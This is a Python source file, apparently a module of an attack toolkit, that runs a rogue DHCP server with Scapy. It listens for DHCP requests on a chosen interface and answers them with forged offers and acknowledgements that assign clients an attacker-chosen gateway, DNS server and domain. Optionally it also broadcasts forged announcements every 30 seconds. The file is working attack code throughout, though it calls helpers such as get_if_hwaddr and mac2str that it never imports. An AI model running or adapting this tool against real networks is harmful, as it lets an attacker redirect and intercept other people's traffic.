from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sniff, sendp
from scapy.layers.dhcp import DHCPTypes
import argparse
import threading
import time
import random

rogue_server_active = False
leased_ips = {}

def execute(args):
    """Execute DHCP rogue server attack"""
    global rogue_server_active
    
    print(f"[DHCP Rogue Server] Starting on interface {args.interface}")
    
    server_ip = args.server_ip if args.server_ip else "192.168.1.100"
    pool_start = args.pool_start if args.pool_start else "192.168.1.150"
    pool_end = args.pool_end if args.pool_end else "192.168.1.200"
    netmask = args.netmask if args.netmask else "255.255.255.0"
    gateway = args.gateway if args.gateway else "192.168.1.1"
    dns_server = args.dns_server if args.dns_server else "8.8.8.8"
    domain = args.domain if args.domain else "evil.local"
    
    print(f"[DHCP Rogue Server] IP: {server_ip}")
    print(f"[DHCP Rogue Server] Pool: {pool_start} - {pool_end}")
    print(f"[DHCP Rogue Server] Gateway: {gateway}")
    print(f"[DHCP Rogue Server] DNS: {dns_server}")
    print(f"[DHCP Rogue Server] Domain: {domain}")
    
    try:
        rogue_server_active = True
        
        handler_thread = threading.Thread(
            target=dhcp_handler,
            args=(args.interface, server_ip, pool_start, pool_end, netmask, gateway, dns_server, domain)
        )
        handler_thread.daemon = True
        handler_thread.start()
        
        if args.announce:
            announce_thread = threading.Thread(
                target=dhcp_announcements,
                args=(args.interface, server_ip, netmask, gateway, dns_server, domain)
            )
            announce_thread.daemon = True
            announce_thread.start()
        
        duration = args.duration if args.duration else 300  # 5 minutes default
        print(f"[DHCP Rogue Server] Running for {duration} seconds. Press Ctrl+C to stop early.")
        
        time.sleep(duration)
        
        rogue_server_active = False
        print("[DHCP Rogue Server] Stopped")
        
        return True
        
    except Exception as e:
        print(f"[DHCP Rogue Server] Error: {e}")
        rogue_server_active = False
        return False

def dhcp_handler(interface, server_ip, pool_start, pool_end, netmask, gateway, dns_server, domain):
    """Handle DHCP requests"""
    print("[DHCP Rogue Server] Listening for DHCP requests")
    
    def handle_dhcp(packet):
        if not DHCP in packet or not rogue_server_active:
            return
        
        msg_type = None
        for opt in packet[DHCP].options:
            if opt[0] == 'message-type':
                msg_type = opt[1]
                break
        
        client_mac = packet[Ether].src
        xid = packet[BOOTP].xid
        
        if msg_type == DHCPTypes.DISCOVER:
            print(f"[DHCP Rogue Server] Discover from {client_mac}")
            
            offered_ip = get_available_ip(pool_start, pool_end, client_mac)
            if offered_ip:
                send_dhcp_offer(interface, client_mac, xid, server_ip, offered_ip, netmask, gateway, dns_server, domain)
        
        elif msg_type == DHCPTypes.REQUEST:
            print(f"[DHCP Rogue Server] Request from {client_mac}")
            
            requested_ip = None
            for opt in packet[DHCP].options:
                if opt[0] == 'requested_addr':
                    requested_ip = opt[1]
                    break
            
            if requested_ip and requested_ip in leased_ips and leased_ips[requested_ip] == client_mac:
                send_dhcp_ack(interface, client_mac, xid, server_ip, requested_ip, netmask, gateway, dns_server, domain)
                print(f"[DHCP Rogue Server] Leased {requested_ip} to {client_mac}")
    
    sniff(iface=interface, filter="udp and (port 67 or 68)", prn=handle_dhcp, store=0, 
          stop_filter=lambda x: not rogue_server_active)

def get_available_ip(pool_start, pool_end, client_mac):
    """Get an available IP from the pool"""
    start = int(pool_start.split('.')[-1])
    end = int(pool_end.split('.')[-1])
    base = '.'.join(pool_start.split('.')[:-1])
    
    for ip, mac in leased_ips.items():
        if mac == client_mac:
            return ip
    
    for i in range(start, end + 1):
        test_ip = f"{base}.{i}"
        if test_ip not in leased_ips:
            leased_ips[test_ip] = client_mac
            return test_ip
    
    return None

def send_dhcp_offer(interface, client_mac, xid, server_ip, offered_ip, netmask, gateway, dns_server, domain):
    """Send DHCP offer"""
    offer = (
        Ether(dst=client_mac, src=get_if_hwaddr(interface)) /
        IP(src=server_ip, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(op=2, yiaddr=offered_ip, siaddr=server_ip, xid=xid, chaddr=mac2str(client_mac)) /
        DHCP(options=[
            ("message-type", "offer"),
            ("server_id", server_ip),
            ("subnet_mask", netmask),
            ("router", gateway),
            ("name_server", dns_server),
            ("domain", domain),
            ("lease_time", 86400),
            "end"
        ])
    )
    
    sendp(offer, iface=interface, verbose=False)

def send_dhcp_ack(interface, client_mac, xid, server_ip, offered_ip, netmask, gateway, dns_server, domain):
    """Send DHCP acknowledgment"""
    ack = (
        Ether(dst=client_mac, src=get_if_hwaddr(interface)) /
        IP(src=server_ip, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(op=2, yiaddr=offered_ip, siaddr=server_ip, xid=xid, chaddr=mac2str(client_mac)) /
        DHCP(options=[
            ("message-type", "ack"),
            ("server_id", server_ip),
            ("subnet_mask", netmask),
            ("router", gateway),
            ("name_server", dns_server),
            ("domain", domain),
            ("lease_time", 86400),
            "end"
        ])
    )
    
    sendp(ack, iface=interface, verbose=False)

def dhcp_announcements(interface, server_ip, netmask, gateway, dns_server, domain):
    """Send periodic DHCP announcements"""
    while rogue_server_active:
        announce = (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=get_if_hwaddr(interface)) /
            IP(src=server_ip, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, siaddr=server_ip) /
            DHCP(options=[
                ("message-type", "ack"),
                ("server_id", server_ip),
                ("subnet_mask", netmask),
                ("router", gateway),
                ("name_server", dns_server),
                ("domain", domain),
                "end"
            ])
        )
        
        sendp(announce, iface=interface, verbose=False)
        time.sleep(30) 

def add_arguments(parser):
    """Add DHCP rogue server specific arguments to parser"""
    parser.add_argument("--server-ip", help="Rogue DHCP server IP address")
    parser.add_argument("--pool-start", help="DHCP pool start address")
    parser.add_argument("--pool-end", help="DHCP pool end address")
    parser.add_argument("--netmask", help="Network mask")
    parser.add_argument("--gateway", help="Gateway IP address")
    parser.add_argument("--dns-server", help="DNS server IP address")
    parser.add_argument("--domain", help="Domain name")
    parser.add_argument("--duration", "-d", type=int, help="Attack duration in seconds")
    parser.add_argument("--announce", action="store_true", help="Send periodic announcements")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DHCP Rogue Server Attack")
    parser.add_argument("--interface", "-i", required=True, help="Network interface")
    parser.add_argument("--server-ip", help="Rogue DHCP server IP address")
    parser.add_argument("--pool-start", help="DHCP pool start address")
    parser.add_argument("--pool-end", help="DHCP pool end address")
    parser.add_argument("--netmask", help="Network mask")
    parser.add_argument("--gateway", help="Gateway IP address")
    parser.add_argument("--dns-server", help="DNS server IP address")
    parser.add_argument("--domain", help="Domain name")
    parser.add_argument("--duration", "-d", type=int, default=300, help="Attack duration in seconds")
    parser.add_argument("--announce", action="store_true", help="Send periodic announcements")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    execute(args)